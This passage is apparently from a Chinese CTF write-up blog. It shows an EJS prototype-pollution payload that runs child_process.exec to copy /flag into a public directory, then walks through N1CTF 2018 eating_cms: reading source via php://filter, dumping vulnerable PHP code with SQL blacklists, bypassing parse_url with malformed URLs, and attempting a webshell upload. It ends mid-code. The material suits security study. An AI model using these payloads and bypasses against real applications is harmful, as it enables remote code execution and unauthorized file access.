<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;);var _tmp2&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>cat /flag &gt; /app/public/flag</code>这东西把<code>cat</code>命令输出的内容写到<code>/app/public/flag</code>下。</p>
<blockquote>
<p>输入不存在路由通过报错找到绝对路径，然后把flag写入public静态目录下面，访问直接&#x2F;flag下载下来</p>
<p>像python，JavaScript这类通过路由设置服务的方式和PHP访问对应文件就有一定的区别，设置了路由的情况下，就不会出现部分文件暴露在网站根目录被访问的情况，像PHP的话可以直接把flag写到网站根目录里面去直接访问获得，不过，他们也有对应的静态目录，静态目录下的文件就可以被直接访问，源码中app.js设置了静态目录<code>app.use(express.static(path.join(\_\_dirname, &#39;public&#39;)));</code>这个设置直接在静态目录下查找文件，因此访问时无需在url中添加public目录<br>所以public下的内容可以被直接访问，通过把flag写到静态目录下也可以直接访问获得</p>
</blockquote>
<p>最终payload:(我看有些师傅最后用<code>;var _tmp2</code>去闭合，我看不懂咋回事直接拿注释符把后面都注释掉了hh)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;)//&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p><code>register.php</code>随便注册一个账号，然后登录：</p>
<p>注意这个<code>URL</code>挺可疑的？<code>GET</code>方式给<code>page</code>传参：</p>
<p><img src="/img/n1ctfeatingcms1.png" srcset="/img/loading.gif" lazyload alt="n1ctfeatingcms1"></p>
<p>伪协议看看能不能读<code>index.php</code>和<code>register.php</code>和<code>user.php</code>的源码(吗的我这里一开始在文件名后面加了<code>.php</code>后缀导致读不出来)：</p>
<p><code>user.php?page=php://filter/convert.base64-encode/resource=info</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//user.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;function.php&quot;</span>);<br><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] ))&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE_admin</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE</span>;<br>&#125;<br><span class="hljs-comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])|| <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;info&#x27;</span>)<br>        &#123;<br><span class="hljs-comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span><br>            <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: user.php?page=guest&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">filter_directory</span>();<br><span class="hljs-comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><br><span class="hljs-comment">//    $page = &#x27;info&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$page</span>.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//info.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly &quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/info.html&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//function.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hacker</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: hacker.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$whitelist</span>&quot;</span>, <span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Hacker</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$blacklist</span>/is&quot;</span>, <span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">Hacker</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">real_escape_string</span>(<span class="hljs-variable">$string</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_query</span>(<span class="hljs-params"><span class="hljs-variable">$sql_query</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql_query</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="hljs-subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="hljs-subst">$pass</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$data</span>[username_which_you_do_not_know];<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] = <span class="hljs-variable">$data</span>[isadmin_which_you_do_not_know_too_too];<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateadmin</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>,<span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="hljs-subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="hljs-subst">$user</span>&#x27; &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br><span class="hljs-comment">//    die($res);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="hljs-subst">$user</span>&#x27;,&#x27;<span class="hljs-subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;insert_id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">session_destroy</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>代码不难理解，首先是这个:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//下面还有个过滤字典，和这个类似就不重复说了</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p><code>parse_url</code> 是一个 PHP 内置函数，用于解析 URL 字符串，将其拆分成各个组成部分。以下是你提供的代码中 <code>parse_url</code> 的使用：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>在这里，<code>$_SERVER[&quot;REQUEST_URI&quot;]</code> 包含当前页面的 URL。通过调用 <code>parse_url</code> 函数，它被解析成一个关联数组，其中包含了 URL 的各个组成部分，如协议、主机、路径、查询参数等。</p>
<p>接下来的代码片段是：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">parse<span class="hljs-constructor">_str($<span class="hljs-params">uri</span>[&#x27;<span class="hljs-params">query</span>&#x27;], $<span class="hljs-params">query</span>)</span>;<br></code></pre></td></tr></table></figure>

<p>它从上一步解析得到的数组 <code>$uri</code> 中取出名为 <code>&#39;query&#39;</code> 的部分，并将其解析成变量。如果 URL 中包含查询字符串（例如 <code>?key1=value1&amp;key2=value2</code>），那么 <code>$query</code> 数组将包含这些参数和对应的值。</p>
<p>综合起来，整个代码片段的目的可能是获取当前页面 URL 的查询参数，并将其解析为一个关联数组 <code>$query</code>。在这个特定的例子中，看起来代码的目的是检查 URL 查询参数中是否包含了某些关键词，如 “flag”、”manage”、”ffffllllaaaaggg”。</p>
</blockquote>
<p>这里他不允许我们去访问<code>flag</code>，<code>manage</code>，<code>ffffllllaaaaggg</code>。可以知道这里是一定藏了东西的。至于<code>parse_url</code>解析存在的问题：<code>https://www.cnblogs.com/Lee-404/p/12826352.html</code>。</p>
<p>所以这里可以通过构造畸形的<code>URL</code>绕过<code>filter</code>函数的检测：</p>
<p><code>////user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can find sth in m4aaannngggeee&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//info和flag没啥有用信息</span><br></code></pre></td></tr></table></figure>

<p>读这个的源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/upload.html&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>访问<code>templates/upload.html</code>发现存在上传界面，随便找了个一句话传上去发现:</p>
<p><img src="/img/nu1lctfeatingcms1.png" srcset="/img/loading.gif" lazyload alt="nu1lctfeatingcms1"></p>
<p>读下这个文件的源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br><span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span 